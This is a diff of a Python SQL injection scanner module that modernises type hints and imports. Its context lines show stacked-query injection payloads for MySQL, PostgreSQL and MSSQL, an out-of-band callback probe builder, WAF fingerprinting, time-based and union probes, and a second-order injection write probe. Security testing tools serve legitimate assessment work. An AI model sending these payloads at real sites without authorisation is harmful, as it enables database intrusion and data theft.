@@ -28,22 +28,21 @@ Design:
 from __future__ import annotations
 
 import re
-import time
-import statistics
 import secrets
+import statistics
+import time
+from collections.abc import Callable
 from dataclasses import dataclass, field
 from difflib import SequenceMatcher
-from typing import Callable, Dict, List, Optional, Tuple
 
-from .sender import send, SendResult
+from .detector import BOOL_FALSE, BOOL_TRUE, ERROR_PROBES, TIME_PROBES, UNION_PROBES, Finding
 from .fingerprint import fingerprint_response
-from .detector import Finding, ERROR_PROBES, BOOL_TRUE, BOOL_FALSE, TIME_PROBES, UNION_PROBES
-
+from .sender import SendResult, send
 
 # ── STACKED probes ──────────────────────────────────────────
 # Silent stacked queries. Success = same body as baseline (server accepted
 # the extra statement without breaking). Bombs on strict single-statement drivers.
-STACKED_PROBES: Dict[str, str] = {
+STACKED_PROBES: dict[str, str] = {
     "mysql":      "1'; DO SLEEP(0)-- -",            # DO returns nothing
     "postgresql": "1'; SELECT 1 WHERE FALSE-- -",
     "mssql":      "1'; DECLARE @x INT-- -",
@@ -67,9 +66,9 @@ HEADER_INJECTION_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "Cookie"
 # "OOB primitive available" (weight capped) unless the caller wires up a real
 # listener via detector_deep.set_oob_verifier().
 
-_OOB_VERIFIER: Optional[Callable[[str], bool]] = None
+_OOB_VERIFIER: Callable[[str], bool] | None = None
 
-def set_oob_verifier(fn: Optional[Callable[[str], bool]]) -> None:
+def set_oob_verifier(fn: Callable[[str], bool] | None) -> None:
     """
     Wire in an external OOB collab. `fn(token) -> bool` should return True
     when the caller's listener has received a hit for `token`.
@@ -79,7 +78,7 @@ def set_oob_verifier(fn: Optional[Callable[[str], bool]]) -> None:
     _OOB_VERIFIER = fn
 
 
-def _oob_payload(dbms: str, callback_host: str, token: str) -> Optional[str]:
+def _oob_payload(dbms: str, callback_host: str, token: str) -> str | None:
     """Build an OOB probe. Returns None for DBMS with no reliable OOB primitive."""
     fq = f"{token}.{callback_host}"
     if dbms == "mysql":
@@ -96,7 +95,7 @@ def _oob_payload(dbms: str, callback_host: str, token: str) -> Optional[str]:
 
 # ── WAF fingerprint (mini) ──────────────────────────────────
 # Full catalog lives in waf.py; this is the fast in-detector trigger check.
-WAF_SIGNATURES: List[Tuple[re.Pattern, str]] = [
+WAF_SIGNATURES: list[tuple[re.Pattern, str]] = [
     (re.compile(r"cloudflare",         re.I), "cloudflare"),
     (re.compile(r"__cfduid|cf-ray",    re.I), "cloudflare"),
     (re.compile(r"akamaighost|akamai", re.I), "akamai"),
@@ -113,7 +112,7 @@ WAF_SIGNATURES: List[Tuple[re.Pattern, str]] = [
 WAF_STATUSES = {403, 406, 419, 429, 501, 999}
 
 
-def _detect_waf(r: SendResult) -> Optional[str]:
+def _detect_waf(r: SendResult) -> str | None:
     if not r or r.status == 0:
         return None
     blob = " ".join([str(r.status), " ".join(f"{k}:{v}" for k, v in r.headers.items()), r.body[:2000]])
@@ -133,18 +132,18 @@ class DeepFinding(Finding):
     metrics that feed strength.compute_strength().
     """
     # per-signal quality metrics
-    signal_meta: Dict[str, Dict] = field(default_factory=dict)
+    signal_meta: dict[str, dict] = field(default_factory=dict)
     # signals seen but LOW confidence — never counted toward .signals[]
-    weak_signals: List[str] = field(default_factory=list)
+    weak_signals: list[str] = field(default_factory=list)
     # detected WAF (if any) — reduces strength for E/O
-    waf: Optional[str] = None
+    waf: str | None = None
     # observed HTTP anomalies (e.g. 500s on some probes)
-    anomalies: List[str] = field(default_factory=list)
+    anomalies: list[str] = field(default_factory=list)
     # computed by strength.py after detection
     strength: float = 0.0            # 0.0 – 1.0
     strength_grade: str = "none"     # none|weak|moderate|strong|critical
     # technique matrix — what extractor.py can attempt
-    techniques: List[str] = field(default_factory=list)
+    techniques: list[str] = field(default_factory=list)
 
 
 # ── low-level helpers ───────────────────────────────────────
@@ -159,7 +158,7 @@ def _now_ms() -> int:
 
 
 def _median_time(url: str, method: str, param: str, inject_in: str,
-                 n: int = 3) -> Tuple[int, List[int]]:
+                 n: int = 3) -> tuple[int, list[int]]:
     """N baseline requests → median ms, raw samples. Kills single-outlier jitter."""
     samples = []
     for i in range(n):
@@ -184,10 +183,10 @@ def analyze_param_deep(url: str,
                        enable_stacked: bool = True,
                        enable_header: bool = True,
                        enable_second_order: bool = False,
-                       second_order_read_url: Optional[str] = None,
-                       oob_callback_host: Optional[str] = None,
-                       abort: Optional[Callable[[], bool]] = None,
-                       progress: Optional[Callable[[str], None]] = None) -> DeepFinding:
+                       second_order_read_url: str | None = None,
+                       oob_callback_host: str | None = None,
+                       abort: Callable[[], bool] | None = None,
+                       progress: Callable[[str], None] | None = None) -> DeepFinding:
     """
     Full deep detector. Fires ≤ max_requests. Never loops.
     Returns DeepFinding with per-signal metadata and strength placeholder
@@ -320,7 +319,7 @@ def analyze_param_deep(url: str,
                 f.evidence.append(f"T(weak): first={delay:.2f}s confirm={delay2:.2f}s")
 
     # ── U: union column-count hint (v1.1 tightened) ──
-    changes = 0; hits: List[int] = []
+    changes = 0; hits: list[int] = []
     for i, probe in enumerate(UNION_PROBES):
         if req_budget <= 0 or stop(): break
         r = send(url, method, probe, param, inject_in=inject_in)
@@ -406,7 +405,7 @@ def analyze_param_deep(url: str,
     if enable_second_order and second_order_read_url and not stop() and req_budget >= 2:
         marker = f"h4b2{secrets.token_hex(4)}"
         payload = f"{marker}',(SELECT 1)-- -"
-        log(f"[2] write probe")
+        log("[2] write probe")
         rw = send(url, method, payload, param, inject_in=inject_in)
         req_budget -= 1; f.payloads_tried += 1; sleep_rate()
         if not rw.error:
@@ -489,12 +488,12 @@ def analyze_param_deep(url: str,
     return f
 
 
-def analyze_targets_deep(targets: List[Dict],
-                         progress: Optional[Callable[[str], None]] = None,
-                         abort: Optional[Callable[[], bool]] = None,
-                         **kw) -> List[DeepFinding]:
+def analyze_targets_deep(targets: list[dict],
+                         progress: Callable[[str], None] | None = None,
+                         abort: Callable[[], bool] | None = None,
+                         **kw) -> list[DeepFinding]:
     """Batch runner. kw is passed through to analyze_param_deep."""
-    out: List[DeepFinding] = []
+    out: list[DeepFinding] = []
     total = len(targets)
     for i, t in enumerate(targets, 1):
         if abort and abort():
